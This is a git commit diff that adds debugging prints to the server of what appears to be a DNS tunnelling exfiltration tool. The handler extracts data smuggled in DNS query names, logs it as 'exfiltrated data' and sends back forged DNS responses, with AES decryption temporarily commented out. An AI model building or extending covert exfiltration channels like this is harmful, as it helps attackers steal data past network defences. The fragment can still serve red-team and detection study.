4632a60dbc7739ec092654e4b9821707ff3b46e5
Gabriel Ho <127755337+ByteMe1001@users.noreply.github.com>
2024-10-13 23:00:57 +0800

    debugging statements

--- server/server.py
+++ server/server.py
@@ -102,15 +102,22 @@ def handle_dns_packet(packet):
         aes_key = clients[client_ip]['aes_key']
 
         if DOMAIN in domain:
-            encrypted_data = domain.replace(f".{DOMAIN}.", "")
-            decrypted_data = decrypt_aes(encrypted_data, aes_key)
+            encrypted_data = domain.replace(f"{DOMAIN}", "")
+            
+            # Debugging
+            decrypted_data = encrypted_data
+            print(f"decrypted after replacement: {decrypted_data}")
+            
+            # decrypted_data = decrypt_aes(encrypted_data, aes_key)
 
             if decrypted_data:
                 print(f"Exfiltrated data from {client_ip} (decrypted): {decrypted_data}")
                 log_client_data(client_ip, decrypted_data)
 
                 response_data = f"Received: {decrypted_data}"
-                encrypted_response = encrypt_aes(response_data, aes_key, get_random_bytes(16))
+                
+                # encrypted_response = encrypt_aes(response_data, aes_key, get_random_bytes(16))
+                encrypted_response = response_data
 
                 forge_dns_response(packet, rdata=encrypted_response)
             else:
